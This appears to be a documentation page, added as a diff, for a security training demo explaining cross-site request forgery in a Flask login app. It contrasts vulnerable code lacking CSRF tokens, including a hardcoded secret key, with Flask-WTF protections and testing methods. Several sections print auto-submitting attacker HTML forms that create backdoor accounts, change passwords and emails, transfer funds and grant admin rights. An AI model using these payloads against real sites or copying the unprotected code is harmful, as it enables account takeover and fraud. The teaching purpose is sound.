@@ -1,0 +1,716 @@
+---
+title: 'Cross-Site Request Forgery (CSRF)'
+description: 'Missing CSRF protection allowing unauthorized state-changing requests'
+icon: 'arrow-right-arrow-left'
+---
+
+<Warning>
+  **Educational Purpose Only** - CSRF attacks can perform unauthorized actions on behalf of victims. Only test on authorized systems.
+</Warning>
+
+## Overview
+
+Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to execute unwanted actions on a web application. In this demo, the vulnerable version lacks CSRF tokens, allowing attackers to trick users into submitting malicious requests that appear to come from the legitimate user.
+
+<Card title="Severity Rating" icon="exclamation-triangle">
+  **MEDIUM to HIGH** - CVSS Score: 6.5/10
+  
+  **CWE Reference**: [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
+</Card>
+
+## Vulnerable Code
+
+The vulnerable forms lack CSRF protection:
+
+<CodeGroup>
+```html vulnerable/templates/login.html:6-16
+<!-- VULNERABLE: No CSRF token -->
+<form method="POST">
+    <div class="form-group">
+        <label>Usuario:</label>
+        <input type="text" name="username" required>
+    </div>
+    <div class="form-group">
+        <label>Contraseña:</label>
+        <input type="password" name="password" required>
+    </div>
+    <button type="submit">Entrar</button>
+</form>
+```
+
+```python vulnerable/app.py:12-15
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']  # No CSRF validation
+        password = request.form['password']
+        # ...
+```
+
+```python vulnerable/app.py:5-6
+app = Flask(__name__)
+app.secret_key = 'clave_super_secreta_123'
+# Missing: CSRFProtect(app)
+```
+</CodeGroup>
+
+### Why This Is Dangerous
+
+1. **No CSRF Tokens**: Forms don't include anti-CSRF tokens to verify request origin
+2. **No Origin Validation**: Server doesn't check `Origin` or `Referer` headers
+3. **Cookie-Based Auth Only**: Relies solely on cookies, which browsers send automatically
+4. **No SameSite Attribute**: Session cookies sent with cross-site requests (see vulnerable/app.py:6)
+5. **State-Changing GET Requests**: Some endpoints might accept GET for state changes (bad practice)
+
+## How CSRF Works
+
+<Steps>
+  <Step title="Victim Authenticates">
+    User logs into the vulnerable application:
+    
+    ```
+    https://auth-vulnerable.onrender.com/login
+    Username: usuario
+    Password: password123
+    ```
+    
+    Browser stores session cookie:
+    ```http
+    Set-Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXJfaWQiOjJ9...
+    ```
+  </Step>
+  
+  <Step title="Attacker Crafts Malicious Page">
+    Attacker creates a page with hidden form:
+    
+    ```html
+    <!-- Hosted on attacker.com -->
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Free Prize!</title>
+    </head>
+    <body>
+        <h1>Congratulations! You won!</h1>
+        <p>Click here to claim your prize...</p>
+        
+        <!-- Hidden malicious form -->
+        <form id="csrf-form" 
+              action="https://auth-vulnerable.onrender.com/register" 
+              method="POST" 
+              style="display:none;">
+            <input name="username" value="attacker_backdoor">
+            <input name="password" value="hacked123">
+            <input name="email" value="attacker@evil.com">
+        </form>
+        
+        <script>
+            // Auto-submit form when page loads
+            document.getElementById('csrf-form').submit();
+        </script>
+    </body>
+    </html>
+    ```
+  </Step>
+  
+  <Step title="Victim Visits Attacker's Page">
+    User clicks on attacker's link (from email, social media, etc.):
+    ```
+    https://attacker.com/prize.html
+    ```
+    
+    The form auto-submits to the vulnerable site.
+  </Step>
+  
+  <Step title="Browser Sends Authenticated Request">
+    Browser automatically includes session cookie:
+    
+    ```http
+    POST /register HTTP/1.1
+    Host: auth-vulnerable.onrender.com
+    Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXJfaWQiOjJ9...
+    Content-Type: application/x-www-form-urlencoded
+    
+    username=attacker_backdoor&password=hacked123&email=attacker@evil.com
+    ```
+    
+    Server processes this as a legitimate request from the authenticated user!
+  </Step>
+  
+  <Step title="Malicious Action Executes">
+    The server:
+    - Sees valid session cookie
+    - Creates backdoor account
+    - User has no idea it happened
+  </Step>
+</Steps>
+
+## Attack Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Account Creation (This Demo)">
+    **Attack**: Create backdoor admin account
+    
+    ```html
+    <html>
+    <body onload="document.forms[0].submit()">
+        <form action="https://auth-vulnerable.onrender.com/register" method="POST">
+            <input type="hidden" name="username" value="backdoor_admin">
+            <input type="hidden" name="password" value="Secret123!">
+            <input type="hidden" name="email" value="attacker@evil.com">
+        </form>
+    </body>
+    </html>
+    ```
+    
+    **Result**: Attacker gains persistent access through backdoor account
+  </Accordion>
+  
+  <Accordion title="Scenario 2: Password Change">
+    **Attack**: Change victim's password
+    
+    ```html
+    <img src="https://auth-vulnerable.onrender.com/change-password?new_password=hacked123" 
+         style="display:none;">
+    ```
+    
+    Or with POST:
+    ```html
+    <form action="https://auth-vulnerable.onrender.com/change-password" method="POST">
+        <input type="hidden" name="new_password" value="hacked123">
+        <input type="hidden" name="confirm_password" value="hacked123">
+    </form>
+    <script>document.forms[0].submit();</script>
+    ```
+    
+    **Result**: Attacker locks victim out of account
+  </Accordion>
+  
+  <Accordion title="Scenario 3: Email Address Change">
+    **Attack**: Change victim's email to attacker's email
+    
+    ```html
+    <form action="https://auth-vulnerable.onrender.com/update-email" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+    <script>document.forms[0].submit();</script>
+    ```
+    
+    **Follow-up**:
+    1. Email changed to attacker's
+    2. Attacker requests password reset
+    3. Reset link goes to attacker's email
+    4. Complete account takeover
+  </Accordion>
+  
+  <Accordion title="Scenario 4: Financial Transactions">
+    **Attack**: Transfer funds (if this were a banking app)
+    
+    ```html
+    <form action="https://bank.com/transfer" method="POST">
+        <input type="hidden" name="to_account" value="attacker_account">
+        <input type="hidden" name="amount" value="10000">
+    </form>
+    <script>document.forms[0].submit();</script>
+    ```
+    
+    **Impact**: Direct financial loss
+  </Accordion>
+  
+  <Accordion title="Scenario 5: Social Media Posting">
+    **Attack**: Post spam/malware links
+    
+    ```html
+    <form action="https://social.com/post" method="POST">
+        <input type="hidden" name="content" value="Check out this amazing deal! http://malware.com">
+    </form>
+    <script>document.forms[0].submit();</script>
+    ```
+    
+    **Result**: Worm-like propagation through social network
+  </Accordion>
+  
+  <Accordion title="Scenario 6: Admin Action Abuse">
+    **Attack**: If victim is admin, perform admin actions
+    
+    ```html
+    <!-- Delete user -->
+    <form action="https://auth-vulnerable.onrender.com/admin/delete-user" method="POST">
+        <input type="hidden" name="user_id" value="123">
+    </form>
+    
+    <!-- Grant admin privileges -->
+    <form action="https://auth-vulnerable.onrender.com/admin/promote" method="POST">
+        <input type="hidden" name="user_id" value="attacker_id">
+        <input type="hidden" name="role" value="admin">
+    </form>
+    <script>
+        document.forms[0].submit();
+        setTimeout(() => document.forms[1].submit(), 1000);
+    </script>
+    ```
+    
+    **Impact**: Complete application compromise
+  </Accordion>
+</AccordionGroup>
+
+## Secure Implementation
+
+The secure version implements CSRF protection using Flask-WTF:
+
+<CodeGroup>
+```python secure/app.py:6-16 (CSRF Protection Setup)
+from flask_wtf.csrf import CSRFProtect
+
+app = Flask(__name__)
+app.secret_key = os.getenv('SECRET_KEY')
+
+# SECURE: Enable CSRF protection
+csrf = CSRFProtect(app)
+
+# Optional: Custom error handler
+@app.errorhandler(CSRFError)
+def handle_csrf_error(e):
+    flash('Token CSRF inválido. Intente nuevamente.', 'danger')
+    return redirect(request.referrer or '/')
+```
+
+```html secure/templates/login.html:6-18 (CSRF Token in Form)
+<!-- SECURE: CSRF token included -->
+<form method="POST">
+    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+    
+    <div class="form-group">
+        <label>Usuario:</label>
+        <input type="text" name="username" required maxlength="50">
+    </div>
+    <div class="form-group">
+        <label>Contraseña:</label>
+        <input type="password" name="password" required>
+    </div>
+    <button type="submit">Entrar</button>
+</form>
+```
+
+```python secure/app.py:32-42 (Automatic Validation)
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    # SECURE: CSRFProtect automatically validates token
+    # No manual validation needed - Flask-WTF does it automatically
+    
+    if request.method == 'POST':
+        # If execution reaches here, CSRF token was valid
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '')
+        # ...
+```
+
+```python Exempt API Endpoints (If Needed)
+from flask_wtf.csrf import csrf_exempt
+
+# Only exempt if using different auth (API keys, JWT, etc.)
+@app.route('/api/data', methods=['POST'])
+@csrf_exempt  # Use with caution!
+def api_endpoint():
+    # Verify API key or JWT token instead
+    if not verify_api_key(request.headers.get('X-API-Key')):
+        abort(401)
+    # ...
+```
+</CodeGroup>
+
+### How CSRF Protection Works
+
+<Steps>
+  <Step title="Server Generates Token">
+    When rendering form, server generates unique CSRF token:
+    
+    ```python
+    # Flask-WTF generates token automatically
+    token = generate_csrf_token()
+    # Example: 'ImFiYzEyMyI.YQzYtA.X8K3jH9mN2pQ1rS5vW7xY'
+    ```
+    
+    Token is:
+    - Cryptographically signed
+    - Tied to user's session
+    - Time-limited
+    - Unique per session
+  </Step>
+  
+  <Step title="Token Embedded in Form">
+    ```html
+    <form method="POST">
+        <input type="hidden" name="csrf_token" value="ImFiYzEyMyI.YQzYtA.X8K3jH9mN2pQ1rS5vW7xY">
+        <!-- Other fields -->
+    </form>
+    ```
+    
+    Can also be in meta tag for AJAX:
+    ```html
+    <meta name="csrf-token" content="ImFiYzEyMyI.YQzYtA.X8K3jH9mN2pQ1rS5vW7xY">
+    ```
+  </Step>
+  
+  <Step title="Form Submitted with Token">
+    ```http
+    POST /login HTTP/1.1
+    Host: auth-secure.onrender.com
+    Cookie: session=...
+    Content-Type: application/x-www-form-urlencoded
+    
+    csrf_token=ImFiYzEyMyI.YQzYtA.X8K3jH9mN2pQ1rS5vW7xY&username=admin&password=pass
+    ```
+  </Step>
+  
+  <Step title="Server Validates Token">
+    ```python
+    # Flask-WTF automatically:
+    # 1. Extracts token from request
+    # 2. Verifies signature
+    # 3. Checks if token matches session
+    # 4. Validates expiration
+    
+    if not validate_csrf_token(request.form.get('csrf_token')):
+        abort(400, "Invalid CSRF token")
+    ```
+    
+    If attacker tries CSRF:
+    - Their page can't access victim's token (same-origin policy)
+    - Request fails validation
+    - Attack prevented
+  </Step>
+</Steps>
+
+## CSRF Mitigation Strategies
+
+<AccordionGroup>
+  <Accordion title="1. CSRF Tokens (Primary Defense)">
+    **Synchronizer Token Pattern**:
+    ```python
+    from flask_wtf.csrf import CSRFProtect, generate_csrf
+    
+    csrf = CSRFProtect(app)
+    
+    # In templates
+    # {{ csrf_token() }}
+    
+    # For AJAX requests
+    @app.route('/get-csrf-token')
+    def get_csrf_token():
+        return {'csrf_token': generate_csrf()}
+    ```
+    
+    **AJAX Usage**:
+    ```javascript
+    // Get token from meta tag
+    const token = document.querySelector('meta[name="csrf-token"]').content;
+    
+    // Include in AJAX request
+    fetch('/api/action', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': token
+        },
+        body: JSON.stringify(data)
+    });
+    ```
+  </Accordion>
+  
+  <Accordion title="2. SameSite Cookie Attribute">
+    **Configuration**:
+    ```python
+    # Strict: Never sent on cross-site requests
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+    
+    # Lax: Sent on top-level navigation (recommended)
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+    
+    # None: Always sent (requires Secure=True)
+    app.config['SESSION_COOKIE_SAMESITE'] = 'None'
+    app.config['SESSION_COOKIE_SECURE'] = True
+    ```
+    
+    **Comparison**:
+    | Scenario | Strict | Lax | None |
+    |----------|--------|-----|------|
+    | Same-site POST | Sent | Sent | Sent |
+    | Cross-site POST | NOT sent | NOT sent | Sent |
+    | Cross-site GET (link) | NOT sent | Sent | Sent |
+    | Cross-site GET (iframe) | NOT sent | NOT sent | Sent |
+    
+    **Recommendation**: Use `Lax` + CSRF tokens for defense in depth
+  </Accordion>
+  
+  <Accordion title="3. Custom Request Headers">
+    For AJAX APIs, require custom headers:
+    
+    ```python
+    @app.before_request
+    def check_custom_header():
+        if request.method in ['POST', 'PUT', 'DELETE']:
+            if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
+                abort(403, "Missing required header")
+    ```
+    
+    **Why this works**: JavaScript can add custom headers, but CSRF attacks using forms cannot
+    
+    ```javascript
+    fetch('/api/action', {
+        method: 'POST',
+        headers: {
+            'X-Requested-With': 'XMLHttpRequest',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    });
+    ```
+  </Accordion>
+  
+  <Accordion title="4. Origin and Referer Validation">
+    ```python
+    @app.before_request
+    def validate_origin():
+        if request.method in ['POST', 'PUT', 'DELETE']:
+            origin = request.headers.get('Origin')
+            referer = request.headers.get('Referer')
+            
+            allowed_origins = [
+                'https://auth-secure.onrender.com',
+                'https://app.example.com'
+            ]
+            
+            # Check Origin header (preferred)
+            if origin:
+                if origin not in allowed_origins:
+                    abort(403, "Invalid origin")
+            # Fall back to Referer
+            elif referer:
+                if not any(referer.startswith(origin) for origin in allowed_origins):
+                    abort(403, "Invalid referer")
+            else:
+                # No Origin or Referer - suspicious
+                abort(403, "Missing origin/referer")
+    ```
+    
+    **Limitations**: Headers can be stripped by proxies/browsers
+  </Accordion>
+  
+  <Accordion title="5. Double-Submit Cookie Pattern">
+    Alternative to server-side token storage:
+    
+    ```python
+    from flask import make_response
+    import secrets
+    
+    @app.route('/login', methods=['GET'])
+    def login_form():
+        # Generate random token
+        csrf_token = secrets.token_hex(32)
+        
+        response = make_response(render_template('login.html', csrf_token=csrf_token))
+        
+        # Set as cookie AND include in form
+        response.set_cookie('csrf_token', csrf_token, 
+                          httponly=False,  # JavaScript needs to read it
+                          secure=True, 
+                          samesite='Strict')
+        
+        return response
+    
+    @app.route('/login', methods=['POST'])
+    def login_submit():
+        # Compare cookie value with form value
+        cookie_token = request.cookies.get('csrf_token')
+        form_token = request.form.get('csrf_token')
+        
+        if not cookie_token or cookie_token != form_token:
+            abort(403, "CSRF validation failed")
+        
+        # Process login...
+    ```
+    
+    **How it works**: Attacker can't read victim's cookie (same-origin policy) to include matching token in form
+  </Accordion>
+  
+  <Accordion title="6. Re-authentication for Sensitive Actions">
+    Require password for critical operations:
+    
+    ```python
+    @app.route('/delete-account', methods=['POST'])
+    def delete_account():
+        # Require password confirmation
+        password = request.form.get('current_password')
+        
+        if not verify_password(session['user_id'], password):
+            flash('Contraseña incorrecta', 'danger')
+            return redirect('/account')
+        
+        # Proceed with deletion
+        delete_user(session['user_id'])
+        
+        return redirect('/')
+    ```
+    
+    **Benefits**: Even if CSRF bypassed, attacker needs victim's password
+  </Accordion>
+</AccordionGroup>
+
+## Testing for CSRF
+
+<Tabs>
+  <Tab title="Manual Testing">
+    Create test HTML file:
+    
+    ```html
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>CSRF Test</title>
+    </head>
+    <body>
+        <h1>CSRF Test Page</h1>
+        
+        <!-- Test vulnerable endpoint -->
+        <form id="csrf-test" 
+              action="https://auth-vulnerable.onrender.com/register" 
+              method="POST">
+            <input type="text" name="username" value="csrf_test_user">
+            <input type="password" name="password" value="testpass123">
+            <input type="email" name="email" value="csrf@test.com">
+            <button type="submit">Submit CSRF Test</button>
+        </form>
+        
+        <!-- Auto-submit test -->
+        <script>
+            // Uncomment to auto-submit
+            // document.getElementById('csrf-test').submit();
+        </script>
+    </body>
+    </html>
+    ```
+    
+    **Testing Steps**:
+    1. Open vulnerable site in browser tab 1
+    2. Login to create session
+    3. Open test.html in browser tab 2 (same browser)
+    4. Submit form
+    5. Check if action succeeded (CSRF vulnerable if yes)
+  </Tab>
+  
+  <Tab title="Burp Suite">
+    **Generate CSRF PoC**:
+    
+    1. Intercept a POST request in Burp Proxy
+    2. Right-click request → "Engagement tools" → "Generate CSRF PoC"
+    3. Burp creates HTML with form
+    4. Test in browser:
+       - Click "Test in browser"
+       - Paste URL in browser where you're authenticated
+       - See if request succeeds
+    
+    **Manual Testing**:
+    1. Send request to Repeater
+    2. Remove CSRF token parameter
+    3. Send request
+    4. If it succeeds, CSRF vulnerable
+  </Tab>
+  
+  <Tab title="Automated Script">
+    ```python
+    import requests
+    from bs4 import BeautifulSoup
+    
+    def test_csrf(base_url, endpoint, form_data):
+        """
+        Test if endpoint is vulnerable to CSRF
+        
+        Returns:
+            - 'protected': CSRF token required
+            - 'vulnerable': No CSRF protection
+        """
+        session = requests.Session()
+        
+        # Login to get authenticated session
+        session.post(f"{base_url}/login",
+                    data={'username': 'test', 'password': 'test'})
+        
+        # Get form page
+        response = session.get(f"{base_url}{endpoint}")
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Check if CSRF token exists
+        csrf_input = soup.find('input', {'name': 'csrf_token'})
+        has_csrf_token = csrf_input is not None
+        
+        # Try submitting without CSRF token
+        response = session.post(f"{base_url}{endpoint}", data=form_data)
+        
+        if response.status_code == 200 and 'error' not in response.text.lower():
+            return 'vulnerable'
+        elif 'csrf' in response.text.lower() or response.status_code == 403:
+            return 'protected'
+        else:
+            return 'unknown'
+    
+    # Test
+    result = test_csrf(
+        'https://auth-vulnerable.onrender.com',
+        '/register',
+        {'username': 'csrf_test', 'password': 'test123', 'email': 'test@test.com'}
+    )
+    print(f"CSRF Protection: {result}")
+    ```
+  </Tab>
+</Tabs>
+
+## Real-World Examples
+
+<CardGroup cols={2}>
+  <Card title="ING Direct (2008)" icon="building-columns">
+    **Issue**: Transfer funds via CSRF
+    
+    **Attack**: Malicious page transferred money from victim's account
+    
+    **Impact**: Financial losses, regulatory fines
+  </Card>
+  
+  <Card title="YouTube (2008)" icon="video">
+    **Issue**: CSRF in video actions
+    
+    **Attack**: Worm added users as friends, favorited videos
+    
+    **Impact**: Mass spam campaign
+  </Card>
+  
+  <Card title="TikTok (2020)" icon="music">
+    **Issue**: CSRF in account deletion
+    
+    **Attack**: Could delete any user's account
+    
+    **Bounty**: $3,860
+  </Card>
+  
+  <Card title="Tesla (2020)" icon="car">
+    **Issue**: CSRF in admin panel
+    
+    **Attack**: Could perform admin actions
+    
+    **Bounty**: $15,000
+  </Card>
+</CardGroup>
+
+## References
+
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
+- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
+- [Flask-WTF Documentation](https://flask-wtf.readthedocs.io/en/stable/csrf.html)
+
+<Card title="Next Steps" icon="arrow-right">
+  Related vulnerabilities:
+  - [XSS](/vulnerabilities/xss) - Often combined with CSRF
+  - [Session Management](/vulnerabilities/session-management) - SameSite cookie configuration
+  - [Security Misconfiguration](/vulnerabilities/security-misconfiguration) - Security headers
+</Card>
